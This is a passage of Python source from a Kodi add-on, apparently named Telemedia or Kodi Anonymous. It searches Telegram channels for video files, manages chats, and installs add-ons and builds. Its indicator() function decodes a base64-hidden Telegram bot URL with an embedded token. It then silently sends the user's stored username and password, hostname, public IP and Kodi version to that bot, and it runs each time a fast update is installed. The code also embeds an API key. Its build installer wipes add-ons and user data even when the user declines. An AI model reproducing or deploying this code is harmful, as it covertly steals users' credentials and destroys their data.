                    t_items=items.replace(' ','.').replace(':','').replace("'","").replace('-','.').replace('[','').replace(']','').replace('..','.').lower()
                    t_name=name.replace('"',"").replace('  ',' ').lower().replace('-','.').replace(' ','.').replace('[','').replace(']','').replace('_','.').replace(':','').replace("'","").replace('..','.')
                    t_items2=c_original.replace(' ','.').replace(':','').replace("'","").replace('-','.').replace('[','').replace(']','').replace('..','.').lower()
                    if (t_items+'.'  in t_name+'.') or (t_items+' '  in t_name+' ') or (t_items+'_'  in t_name+'_') or (t_items.replace('.','_')+'_'  in t_name.replace('.','_')+'_') or (t_items.replace('.','-')+'_'  in t_name.replace('.','-')+'_'):
                       if (o_name in name) or (t_items2 in t_name):
                        ok=True
                        break
            
            if not ok:
                logging.warning('Not Ok')
                logging.warning(t_items)
                logging.warning(t_name)
                exclude.append((name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title))
            else:
                  
                  if once==0:
                    # once=1
                    menu.append([name,q, '',q,'','','',''])
                    d_save.append((name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot))
                  addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)

    all_ok=[]
    for items in all_t_links:
        
            
        all_ok.append(hash_index[items.lower()])
    return all_links,all_ok

def search2(tmdb,type,last_id_pre,search_entered_pre,icon_pre,fan_pre,season,episode,no_subs=0,original_title='',heb_name='',dont_return=True,manual=True):
    import random
   
   
    last_id=last_id_pre.split('$$$')[0]
    last_id_msg=last_id_pre.split('$$$')[1]
   
    
    
    query=search_entered_pre
    query=query.replace('%20',' ').replace('%27',"'").replace('%3a',":")
    
    
    num=random.randint(1,10001)
    all_links=[]
    if type=='all':
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchMessages', 'query': query,'offset_message_id':last_id,'offset_chat_id':last_id_msg,'limit':100, '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        if 'messages' not in event:
            time.sleep(0.1)
            num=random.randint(1,10001)
            logging.warning('Telemedia missing event22')
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchMessages', 'query': query,'offset_message_id':last_id,'offset_chat_id':last_id_msg,'limit':100, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        counter_ph=0
        for items in event['messages']:  
            #logging.warning(items)
            
            if 'document' in items['content']:
                name=items['content']['document']['file_name']
                if '.mkv' not in name and '.mp4' not in name and '.avi' not in name:
                    continue
                size=items['content']['document']['document']['size']
                f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                q,loc=get_q(name)
                link_data={}
                link_data['id']=str(items['content']['document']['document']['remote']['id'])
                link_data['m_id']=items['id']
                link_data['c_id']=items['chat_id']
                f_lk=json.dumps(link_data)
                all_links.append((name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                #addLink( name, str(items['content']['document']['document']['id']),3,False, icon_pre,fan_pre,f_size2,data=data,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'video' in items['content']:
                    name=items['content']['video']['file_name']
                    
                    size=items['content']['video']['video']['size']
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    logging.warning('items')
                    q,loc=get_q(name)
                    link_data={}
                    link_data['id']=str(items['content']['video']['video']['remote']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    all_links.append(( name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                    #addLink( name, str(items['content']['video']['video']['id']),3,False, icon_pre,fan_pre,f_size2,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'caption' in items['content']:
                    txt_lines=items['content']['caption']['text'].split('\n')
                    all_l=[]
                    name=txt_lines[0]
                    rem_lines=[]
                    for lines in txt_lines:
                        if 'upfile' not in lines and 'drive.google' not in lines:
                          rem_lines.append(lines)
                          continue
                        
                            
                        all_l.append(lines)
                    if len(all_l)==0:
                        continue
                    icon=icon_pre
                    fan=fan_pre
                    
                           
                    q,loc=get_q(name)
                    all_links.append(('[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,q,loc, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                    #addLink( '[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,False, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            elif 'web_page' in items['content']:
                name=items['content']['web_page']['title']
                link=items['content']['web_page']['url']
                plot=items['content']['web_page']['description']
                if 'upfile' not in link and 'drive.google' not in link:
                      
                      continue
                icon=icon_pre
                fan=fan_pre
                
                logging.warning('NAME22:'+name)
                q,loc=get_q(name)
                
                all_links.append(('[COLOR lightgreen]'+ name+'[/COLOR]', link,9,q,loc, icon,fan,plot.replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                #addLink( '[COLOR lightgreen]'+ name+'[/COLOR]', link,9,False, icon,fan,plot.replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            f_id=items['chat_id']
    
    return all_links

def get_links(tv_movie,original_title,name,season_n,episode_n,season,episode,show_original_year,id):
        global global_var,stop_all,progress
        # if season!=None and season!="%20":
              # tv_movie='tv'
        # else:
              # tv_movie='movie'
    # try:
    
        once=0
        # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'get_links')))
        o_name=name
        progress='Start'
        f_all_links=[]
        start_time=time.time()
        all_names=[]
        if tv_movie=='movie':
            
            all_links=[]
            all_links=search2(id,'all','0$$$0',name,'','',season,episode,no_subs=0,original_title=original_title,dont_return=False,manual=False)
            all_links=all_links+search2(id,'all','0$$$0',original_title,'','',season,episode,original_title=original_title,dont_return=False,manual=False)
            all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
            
            for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
                if name.encode('base64') in all_names:
                    continue
                
                all_names.append(name.encode('base64'))
                if 'upfile' not in link and 'drive.google' not in link:
                    plot='Direct TEME- '+plot
                else:
                    plot='Direct - '+plot
                f_all_links.append((name ,link,plot,q))
                global_var=f_all_links
        else:
            # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'get_links')))
            c_original=original_title.replace('%20','.').replace(' ','.').replace('%27',"'").replace("'","").replace('%3a',":")
            options=[name+' ע%s פ%s'%(season,episode),name+' ע%sפ%s'%(season,episode),name+' עונה %s פרק %s'%(season,episode),c_original+'.S%sE%s'%(season_n,episode_n),c_original+'.S%sE%s'%(season,episode)]
            #if 'the' in original_title.lower():
            #    options.append(c_original.replace('The','').replace('the','')+'.S%sE%s'%(season_n,episode_n))
            options2=[' ע%s פ%s'%(season,episode),' ע%sפ%s'%(season,episode),' עונה %s פרק %s'%(season,episode),'.S%sE%s'%(season_n,episode_n),'.S%sE%s'%(season,episode)]
            all_links=[]
            for items in options:
                logging.warning('Searching:')
                logging.warning(items)
                all_links=all_links+search2(id,'all','0$$$0',items,'','',season,episode,no_subs=1,original_title=original_title,heb_name=name,dont_return=False,manual=False)

            
            exclude=[]
            for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
                ok=False
                if name.encode('base64') in all_names:
                    continue
                
                all_names.append(name.encode('base64'))
                for items in options2:
                    t_items=items.replace(' ','.').replace(':','').replace("'","").replace('-','.').replace('[','').replace(']','').replace('..','.').lower()
                    t_name=name.replace('"',"").replace('  ',' ').lower().replace('-','.').replace(' ','.').replace('[','').replace(']','').replace('_','.').replace(':','').replace("'","").replace('..','.')
                    t_items2=c_original.replace(' ','.').replace(':','').replace("'","").replace('-','.').replace('[','').replace(']','').replace('..','.').lower()
                    if (t_items+'.'  in t_name+'.') or (t_items+' '  in t_name+' ') or (t_items+'_'  in t_name+'_') or (t_items.replace('.','_')+'_'  in t_name.replace('.','_')+'_') or (t_items.replace('.','-')+'_'  in t_name.replace('.','-')+'_'):
                       if (o_name in name) or (t_items2 in t_name):
                        ok=True
                        break
          
                if not ok:
                    color='red'
                    exclude.append((name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title))
                else:
                     color='white'
                if 'upfile' not in link and 'drive.google' not in link:
                
                    plot='Direct TEME- '+plot
                else:
                    plot='Direct - '+plot
                if color =='red':
                    plot='[COLOR red]'+plot+'[/COLOR]'
                f_all_links.append((name ,link,plot,q))
                global_var=f_all_links
        elapsed_time = time.time() - start_time
        progress=' Done '+time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
        return global_var,f_all_links,tv_movie
        
    # except Exception as e:
        # logging.warning('Error in tele:'+str(e))
    
def clear_all():
    import shutil
    data={'type':'logout',
         'info':'quit'
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    shutil.rmtree(user_dataDir)
    clear_files()
    LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הכל נוקה[/COLOR]' % COLOR2)
def search_groups(icon_o,fan_o):
        all_d=[]
        from resources.modules.tmdb import get_movies
        search_entered=''
        keyboard = xbmc.Keyboard(search_entered, 'הכנס מילות חיפוש כאן')
        keyboard.doModal()
        if keyboard.isConfirmed() :
               query = keyboard.getText()
               if query=='':
                sys.exit()
                

        addNolink( '[COLOR blue][I]---סרטים---[/I][/COLOR]', id,27,False,fan=' ', iconimage=' ',plot=' ')
        get_movies('http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query={0}&language={1}&append_to_response=origin_country&page=1'.format(query,lang),global_s=True)
        
        addNolink( '[COLOR blue][I]---סדרות---[/I][/COLOR]', id,27,False,fan=' ', iconimage=' ',plot=' ')
        get_movies('http://api.themoviedb.org/3/search/tv?api_key=34142515d9d23817496eeb4ff1d223d0&query={0}&language={1}&page=1'.format(query,lang),global_s=True)
        
        
        
        
        
        
        
        
        
        
        # search_entered=''
        # #'Enter Search'
        # keyboard = xbmc.Keyboard(search_entered, Addon.getLocalizedString(32025))
        # keyboard.doModal()
        # if keyboard.isConfirmed():
                # query = keyboard.getText()
        # else:
            # return 0
        num=random.randint(0,60000)
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChats', 'query': query.decode('utf-8'), '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        dp = xbmcgui.DialogProgress()
        dp.create('Please Wait...','Adding Groups', '','')
        dp.update(0, 'Please Wait...','Adding Groups', '' )
    
        logging.warning(json.dumps(event))
        counter=0
        counter_ph=10000
        zzz=0
        for items in event['chat_ids']:
            num=random.randint(0,60000)
            data={'type':'td_send',
                     'info':json.dumps({'@type': 'getChat','chat_id':items, '@extra':num})
                     }
            event_in=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            logging.warning(json.dumps(event_in))
            if dp.iscanceled():
                          dp.close()
                         
                          break
            j_enent=(event_in)
            
            dp.update(int(((zzz* 100.0)/(len(event['chat_ids']))) ), 'Please Wait...','Adding Groups', j_enent['@type'].encode('utf8') )
            if j_enent['@type']=='chat' and len(j_enent['title'])>1:
                
                icon_id=''
                fan_id=''
                fanart=''
                icon=''
                name=j_enent['title']
             
                color='white'
                if 'is_channel' in j_enent['type']:
                    if j_enent['type']['is_channel']==False:
                        
                        genere='Chat'
                        color='lightblue'
                    else:
                        genere='Channel'
                        color='khaki'
                else:
                     genere=j_enent['type']['@type']
                     color='lightgreen'
                if 'last_message' in j_enent:
                    plot=name.encode('utf8')
                    pre=j_enent['last_message']['content']
               
                    if 'caption' in pre:
                        plot=j_enent['last_message']['content']['caption']['text'].encode('utf8')
                    elif 'text' in pre:
                        if 'text' in pre['text']:
                            plot=j_enent['last_message']['content']['text']['text'].encode('utf8')
                    
                        
                else:
                    plot=name.encode('utf8')
                dp.update(int(((zzz* 100.0)/(len(event['chat_ids']))) ), 'Please Wait...','Adding Groups', name.encode('utf8') )
                zzz+=1
             
                if 'photo' in j_enent:
                   
                   if 'small' in j_enent['photo']:
                     counter_ph+=1
                     icon_id=j_enent['photo']['small']['id']
                     f_name=str(j_enent['id'])+'_small.jpg'
                     mv_name=os.path.join(logo_path,f_name)
                     if os.path.exists(mv_name):
                        icon=mv_name
                     else:
                        icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                   if 'big' in j_enent['photo']:
                     counter_ph+=1
                     fan_id=j_enent['photo']['big']['id']
                     f_name=str(j_enent['id'])+'_big.jpg'
                     mv_name=os.path.join(logo_path,f_name)
                     if os.path.exists(mv_name):
                        fanart=mv_name
                     else:
                        fanart=download_photo(fan_id,counter_ph,f_name,mv_name)
                
                
                aa=addDir3('[COLOR %s]'%color+name.encode('utf8')+'[/COLOR]',str(items),2,icon,fanart,plot+'\nfrom_plot',generes=genere,data='0',last_id='0$$$0$$$0$$$0',image_master=icon+'$$$'+fanart,join_menu=True)
                all_d.append(aa)
            
            counter+=1
        if len(all_d)>0:
             
            addNolink( '[COLOR lightblue][I]%s[/I][/COLOR]'%'תוצאות מקבוצות', 'www',99,False,iconimage=icon_o,fan=fan_o)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
        dp.close()
               
def join_chan(url):
    num=random.randint(0,60000)
    data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': url, '@extra': num})
             }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning(json.dumps(event))
    if event["@type"]=='ok':
        #Joined OK
        xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', Addon.getLocalizedString(32029)))
    else:
        #Error in join
        xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', Addon.getLocalizedString(32030)))

def leave_chan(name,url):
    num=random.randint(0,60000)
    #"Leave Channel"
    #Leave    
    ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32031),'?%s'%name+(Addon.getLocalizedString(32032)))
    if ok:
        data={'type':'td_send',
             'info':json.dumps({'@type': 'leaveChat', 'chat_id': url, '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        logging.warning(json.dumps(event))
        if event["@type"]=='ok':
            xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', Addon.getLocalizedString(32067)))
            xbmc.executebuiltin('Container.Refresh')
        else:
            xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', Addon.getLocalizedString(32068)))
def dis_or_enable_addon(addon_id, enable="true"):
    import json
    logging.warning('ADDON ID:'+addon_id)
    addon = '"%s"' % addon_id
    if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
        logging.warning('already Enabled')
        return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
    elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
        return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
    else:
        do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
        logging.warning(do_json)
        query = xbmc.executeJSONRPC(do_json)
        response = json.loads(query)
        if enable == "true":
            logging.warning("### Enabled %s, response = %s" % (addon_id, response))
        else:
            logging.warning("### Disabled %s, response = %s" % (addon_id, response))
    return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
def showText(heading, text):
    id = 10147
    xbmc.executebuiltin('ActivateWindow(%d)' % id)
    xbmc.sleep(100)
    win = xbmcgui.Window(id)
    retry = 50
    while (retry > 0):
        try:
            xbmc.sleep(10)
            retry -= 1
            win.getControl(1).setLabel(heading)
            win.getControl(5).setText(text)
            return
        except:
            pass
def copyDirTree(root_src_dir,root_dst_dir):
    """
    Copy directory tree. Overwrites also read only files.
    :param root_src_dir: source directory
    :param root_dst_dir:  destination directory
    """
    not_copied=[]
    for src_dir, dirs, files in os.walk(root_src_dir):
        dst_dir = src_dir.replace(root_src_dir, root_dst_dir, 1)
        if not os.path.exists(dst_dir):
            os.makedirs(dst_dir)
        for file_ in files:
            
        
            src_file = os.path.join(src_dir, file_)
            dst_file = os.path.join(dst_dir, file_)
            if os.path.exists(dst_file):
                try:
                    os.remove(dst_file)
                except Exception as exc:
                    #os.chmod(dst_file, stat.S_IWUSR)
                    #os.remove(dst_file)
                    logging.warning('Error del:'+dst_file)
                    logging.warning(exc)
            try:
                shutil.copy(src_file, dst_dir)
            except:
              if '.dll' not in file_ and '.so' not in file_:
                not_copied.append(file_)
    return not_copied
def install_addon(name,url,silent=False,Delete=True):
    from zfile import ZipFile
    logging.warning(name)
    logging.warning(xbmc.getCondVisibility("System.HasAddon(%s)" % name.split('-')[0]))
    logging.warning(url)
    logging.warning(xbmc.getInfoLabel('System.AddonVersion(%s)'%name.split('-')[0]))
    
    num=random.randint(0,60000)
    #Install
    logging.warning('url::'+url)
    url=json.loads(url)['id']
    if silent:
        ok=True
    else:
        ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32033),(Addon.getLocalizedString(32033)+' %s?'%name))
    if ok:
        if silent==False:
            dp = xbmcgui.DialogProgress()
            dp.create('Telemedia', '[B][COLOR=yellow]Installing[/COLOR][/B]','')
        if Delete:
            try:
                if os.path.exists(addon_path):
                    shutil.rmtree(addon_path)
            except Exception as e:
                logging.warning('error removing folder:'+str(addon_path)+','+str(e))
            if not xbmcvfs.exists(addon_path+'/'):
                os.makedirs(addon_path)
        mv_name=os.path.join(addon_path,name)
        logging.warning('Downloading addon')
        addon=download_photo(url,num,name,mv_name)
        
        if silent==False:
            dp.update(0,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Extracting[/COLOR][/B]')
        zf = ZipFile(addon)

        uncompress_size = sum((file.file_size for file in zf.infolist()))

        extracted_size = 0

        for file in zf.infolist():
            extracted_size += file.file_size
            if silent==False:
                dp.update(int((extracted_size*100.0)/uncompress_size),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Extracting[/COLOR][/B]',file.filename)
            
            zf.extract(member=file, path=addon_extract_path)
        zf.close()
        f_o = os.listdir(addon_extract_path)
        
            
        file = open(os.path.join(addon_extract_path,f_o[0], 'addon.xml'), 'r') 
        file_data= file.read()
        file.close()
        regex='id=(?:"|\')(.+?)(?:"|\')'
        nm=re.compile(regex).findall(file_data)[0]
        if not xbmc.getCondVisibility("System.HasAddon(%s)" % name.split('-')[0]):
            regex='import addon=(?:"|\')(.+?)(?:"|\')'
            dep=re.compile(regex).findall(file_data)
            missing=[]
            if silent==False:
                dp.update(90,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Dependencies[/COLOR][/B]','')
            zzz=0
            for items in dep:
                if silent==False:
                    dp.update(int((extracted_size*100.0)/len(items)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Dependencies[/COLOR][/B]',items)
                zzz+=1
                if not xbmc.getCondVisibility("System.HasAddon(%s)" % items):
                    missing.append(items)
            if len(missing)>0:
                showText('Missing Dependencies','\n'.join(missing))
                return 0
        addon_p=xbmc.translatePath("special://home/addons/")
        #dis_or_enable_addon(nm, enable="false")
        #xbmc.sleep(1000)
        
        files = os.listdir(addon_extract_path)
        logging.warning(os.path.join(addon_p,f_o[0]))
        #if os.path.exists(os.path.join(addon_p,f_o[0])):
        #    shutil.rmtree(os.path.join(addon_p,f_o[0]))
        logging.warning('Copy')
        not_copied=copyDirTree(os.path.join(addon_extract_path,f_o[0]),os.path.join( addon_p,f_o[0]))
        if len(not_copied)>0:
            showText('File That was not copied', '\n'.join(not_copied))
        #shutil.move(os.path.join(addon_extract_path,f_o[0]), addon_p)
        xbmc.executebuiltin("XBMC.UpdateLocalAddons()")
        if silent==False:
            dp.update(100,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Cleaning[/COLOR][/B]','')
        time.sleep(1)
        dis_or_enable_addon(nm)
        shutil.rmtree(addon_path)
        if silent==False:
            dp.close()
        #'Installed'
        #'Installation complete'
        if silent==False:
            xbmcgui.Dialog().ok(Addon.getLocalizedString(32034),Addon.getLocalizedString(32035))
def indicator():
       # STARTP2()
       try:
          import json,urllib2
          wiz=xbmcaddon.Addon('plugin.program.Anonymous')
          input= (wiz.getSetting("user"))
          input2= (wiz.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXk9eb15XXnyDXnteU15nXqCDXk9eo15og15jXnNee15PXmdeUOg=='
          x=urllib2.urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urllib2.urlopen(error_ad.decode('base64')+' מערכת הפעלה: '+(socket.gethostbyaddr(socket.gethostname())[0])+' שם משתמש: '+userr +' סיסמה: '+passs+' קודי: '+kodiinfo+' כתובת: '+local_ip).readlines()
          #          x=urllib2.urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def install_fastupdate(name,url,silent=False,Delete=True):
    from zfile import ZipFile
    logging.warning(name)
    logging.warning(xbmc.getCondVisibility("System.HasAddon(%s)" % name.split('-')[0]))
    logging.warning(url)
    logging.warning(xbmc.getInfoLabel('System.AddonVersion(%s)'%name.split('-')[0]))
    dir=xbmc.translatePath("special://home/")
    num=random.randint(0,60000)
    #Install
    logging.warning('url::'+url)
    url=json.loads(url)['id']
    if silent:
        ok=True
    else:
        ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32033),(Addon.getLocalizedString(32033)+' %s?'%name))
    if ok:
        if silent==False:
            dp = xbmcgui.DialogProgress()
            dp.create('Kodi Anonymous', '[B][COLOR=yellow]מתקין[/COLOR][/B]','')
        if Delete:
            try:
                if os.path.exists(addon_path):
                    shutil.rmtree(addon_path)
            except Exception as e:
                logging.warning('error removing folder:'+str(addon_path)+','+str(e))
            if not xbmcvfs.exists(addon_path+'/'):
                os.makedirs(addon_path)
        mv_name=os.path.join(addon_path,name)
        logging.warning('Downloading addon')
        addon=download_photo(url,num,name,mv_name)
        
        if silent==False:
            dp.update(0,'[B][COLOR=green]Kodi Anonymous[/COLOR][/B]', '[B][COLOR=yellow]מחלץ קבצים[/COLOR][/B]')
        zf = ZipFile(addon)

        uncompress_size = sum((file.file_size for file in zf.infolist()))

        extracted_size = 0
        ReloadSkin=False
        for file in zf.infolist():
            extracted_size += file.file_size
            if silent==False:
                dp.update(int((extracted_size*100.0)/uncompress_size),'[B][COLOR=green]Kodi Anonymous[/COLOR][/B]', '[B][COLOR=yellow]מחלץ קבצים[/COLOR][/B]',file.filename)
            
            zf.extract(member=file, path=dir)
            if 'skin.Premium.mod' in zf.extract(member=file, path=dir):
               ReloadSkin=True
        zf.close()
        # f_o = os.listdir(addon_extract_path)
        
            
        # file = open(os.path.join(addon_extract_path,f_o[0], 'addon.xml'), 'r') 
        # file_data= file.read()
        # file.close()
        # regex='id=(?:"|\')(.+?)(?:"|\')'
        # nm=re.compile(regex).findall(file_data)[0]
        # if not xbmc.getCondVisibility("System.HasAddon(%s)" % name.split('-')[0]):
            # regex='import addon=(?:"|\')(.+?)(?:"|\')'
            # dep=re.compile(regex).findall(file_data)
            # missing=[]
            # if silent==False:
                # dp.update(90,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Dependencies[/COLOR][/B]','')
            # zzz=0
            # for items in dep:
                # if silent==False:
                    # dp.update(int((extracted_size*100.0)/len(items)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Dependencies[/COLOR][/B]',items)
                # zzz+=1
                # if not xbmc.getCondVisibility("System.HasAddon(%s)" % items):
                    # missing.append(items)
            # if len(missing)>0:
                # showText('Missing Dependencies','\n'.join(missing))
                # return 0
        # addon_p=xbmc.translatePath("special://home/addons/")
        #dis_or_enable_addon(nm, enable="false")
        #xbmc.sleep(1000)
        
        # files = os.listdir(addon_extract_path)
        # logging.warning(os.path.join(addon_p,f_o[0]))
        #if os.path.exists(os.path.join(addon_p,f_o[0])):
        #    shutil.rmtree(os.path.join(addon_p,f_o[0]))
        # logging.warning('Copy')
        # not_copied=copyDirTree(os.path.join(addon_extract_path,f_o[0]),os.path.join( addon_p,f_o[0]))
        # if len(not_copied)>0:
            # showText('File That was not copied', '\n'.join(not_copied))
        #shutil.move(os.path.join(addon_extract_path,f_o[0]), addon_p)
        xbmc.executebuiltin("XBMC.UpdateLocalAddons()")
        xbmc.executebuiltin( "RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )
        indicator()
        if ReloadSkin== True :

         xbmc.executebuiltin("ReloadSkin()")
         
        if silent==False:
            dp.update(100,'[B][COLOR=green]Kodi Anonymous[/COLOR][/B]', '[B][COLOR=yellow]מנקה קבצים[/COLOR][/B]','')
        time.sleep(1)
        # dis_or_enable_addon(nm)
        # shutil.rmtree(addon_path)
        if silent==False:
            dp.close()
        #'Installed'
        #'Installation complete'
        NAMEWIZARD='Kodi Anonymous'
        if silent==False:
            xbmcgui.Dialog().ok(Addon.getLocalizedString(32034),Addon.getLocalizedString(32035))
            # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, NAMEWIZARD),'[COLOR %s]הבילד עודכן![/COLOR]' % COLOR2)
def download_file_loc(id):
        try:
            
            path=''
            dp = xbmcgui.DialogProgress()
            dp.create('Telemedia', '[B][COLOR=yellow]Loading[/COLOR][/B]')
            num=random.randint(0,60000)
            data={'type':'td_send',
             'info':json.dumps({'@type': 'downloadFile','file_id':int(id), 'priority':1,'offset':0,'limit':0, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
           
            j_enent_o=(event)
            
           
            
            j_enent_o=(event)
            once=True
            while True:
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'getFile','file_id':int(id), '@extra': num})
                 }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
               
                
                #event = td_receive()
                
                if dp.iscanceled():
                    num=random.randint(0,60000)
                    data={'type':'td_send',
                         'info':json.dumps({'@type': 'cancelDownloadFile','file_id':int(id), '@extra': num})
                         }
                    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                    path=''
                        
                    break
                
                if event:
                    if 'file' in event:
                        size=event['file']['size']
                    else:
                        size=event['size']
                    if event.get('@type') =='error':
               
                        xbmcgui.Dialog().ok('Error occurred',str(event.get('message')))
                        break
                    
                        
                    
                    if 'expected_size' in event:
                        
                        dp.update(int((event['local']['downloaded_size']*100.0)/size),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Downloading %s/%s[/COLOR][/B]'%(str(event['local']['downloaded_size']),str(size)))
                        
                        
                        if len(event['local']['path'])>0 and event['local']['is_downloading_completed']==True:
                            size=event['size']
                            path=event['local']['path']
                            break
                xbmc.sleep(100)
            dp.close()
            return path
        except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Main:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
def install_build(original_title,url):
    import shutil
    from zfile import ZipFile
    ok=xbmcgui.Dialog().yesno(("Install"),('Download and Install [COLOR lightblue][B] %s [/B][/COLOR]?'%original_title))
    if ok:
        path=download_file_loc(url)
        logging.warning(path)
    dp = xbmcgui.DialogProgress()
    dp.create('Telemedia', '[B][COLOR=yellow]Cleaning Kodi[/COLOR][/B]')
    addon_p=xbmc.translatePath("special://home/addons/")
    f_list=os.listdir(addon_p)
    zz=0
    error_list=[]
    for items in f_list:
        if 'telemedia' not in items and 'requests' not in items and  'pyxbmct' not in items:
            n_f=os.path.join(addon_p,items)
            dp.update(int((zz)/len(f_list)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Cleaning Kodi Addons[/COLOR][/B]',items)
            zz+=1
            try:
                os .unlink (n_f)
                shutil.rmtree(n_f)
            except:
                error_list.append('Removing:'+n_f)
                
    addon_p=xbmc.translatePath("special://home")
    zz=0
    for items in f_list:
        if 'addons' not in items:
            n_f=os.path.join(addon_p,items)
            dp.update(int((zz)/len(f_list)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Cleaning Kodi user data[/COLOR][/B]',items)
            zz+=1
            try:
                os .unlink (n_f)
                shutil.rmtree(n_f)
            except:
                error_list.append('Removing:'+n_f)
    addon_p=xbmc.translatePath("special://home/")
    
    zz=0
    with zipfile.ZipFile(path) as zf:
     z_list=zf.infolist()
     for member in tqdm(z_list, desc='Extracting '):
         try:
            dp.update(int((zz)/len(z_list)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Extracting[/COLOR][/B]',member)
            zz+=1
            if 'telemedia' not in member:
                zf.extract(member, addon_p)
         except zipfile.error as e:
             error_list.append(member)
             pass
    if len(error_list)>0:
